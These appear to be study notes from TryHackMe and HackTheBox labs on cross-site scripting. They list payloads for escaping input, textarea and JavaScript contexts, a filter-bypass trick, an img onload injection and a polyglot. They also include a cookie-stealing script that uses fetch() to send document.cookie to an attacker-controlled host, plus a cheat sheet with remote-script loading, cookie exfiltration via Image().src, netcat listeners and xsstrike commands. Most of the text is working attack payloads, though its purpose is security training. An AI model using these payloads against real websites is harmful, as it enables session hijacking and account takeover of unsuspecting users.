# Scenarios
### If you enter information into a field and it returns that info on a page such as:
![49444bf865cdc230d9855b53d93745c6.png](49444bf865cdc230d9855b53d93745c6.png)
-  Test for 
```
<script>alert('THM');</script>
```

### If your response is being reflected through an input tag:
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/2f6b23615d6970aab8e1fb2a8d352e9f.png)
- It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: 
```
"><script>alert('THM');</script>
```
- the `">` which closes the value parameter and then closes the input tag.  This now closes the input tag properly and allows the JavaScript payload to run:
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/21a6597c0964f08c69ebffbf014a886a.png)

### same as the previous, but your name gets reflected inside an HTML tag, this time the textarea tag:
![c3d0d38d23fab0608bc3ca8b9441974c.png](Screenshots/c3d0d38d23fab0608bc3ca8b9441974c.png)
- to escape the textarea tag, use the following payload: 
```
</textarea><script>alert('THM');</script>
```
- `</textarea>` causes the textarea element to close so the script will run.

### your name gets reflected in some JavaScript code.
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/80fd5abe95b63ce52ff0ff9f9f6f6d57.png)
- You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload 
```
';alert('THM');//
```
- The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

### if you try the `<script>alert('THM');</script>` payload, it won't work. When you view the page source, you'll see why.  
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9bd2142b2bcd4b4cba34e571550294e4.png)  
- The word `script`  gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.  
- When a word gets removed from a string, there's a helpful trick that you can try:
**Original Payload:**
`<sscriptcript>alert('THM');</sscriptcript>`

**Text to be removed (by the filter):**
`<sscriptcript>alert('THM');</sscriptcript>`

**Final Payload (after passing the filter):**
`<script>alert('THM');</script>`

- To do this, use the following payload:
```
<sscriptcript>alert('THM');</sscriptcript>
```

### When prompted to enter an image path
Here, where we had to escape from the value attribute of an input tag, we can try `"><script>alert('THM');</script>` , but that doesn't seem to work.
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8856b113fd514db704157837a6e6aeb4.png)  
- You can see that the < and > characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. 
- The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.
- change our payload to reflect this:
```
/images/cat.jpg" onload="alert('THM');
``` 
- Then viewing the page source, and you'll see how this will work.
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3260719921aba8ad6eb8d887094fcb87.png)

### Polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
-  XSS polyglots are useful for **quick and broad** testing, but they **aren't enough** for thorough XSS testing. You’ll need to craft **context-specific payloads** to evade filters, WAFs, and different sanitization methods.

### Extract cookies when another user visits the same site and loads our script
Our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice.
1. Firstly, we'll need to set up a listening server to receive the information. `nc -lnvp PORT`
2. Build the payload:
```
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```
- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the request catcher URL or your IP address from your attacking box
- `PORT_NUMBER` is the port number you are using to listen for connections on 
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
- `</script>`closes the JavaScript code block.
3. Wait for the connection


| Code                                                                                          | Description                       |
| --------------------------------------------------------------------------------------------- | --------------------------------- |
| **XSS Payloads**                                                                              |                                   |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
| **Commands**                                                                                  |                                   |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |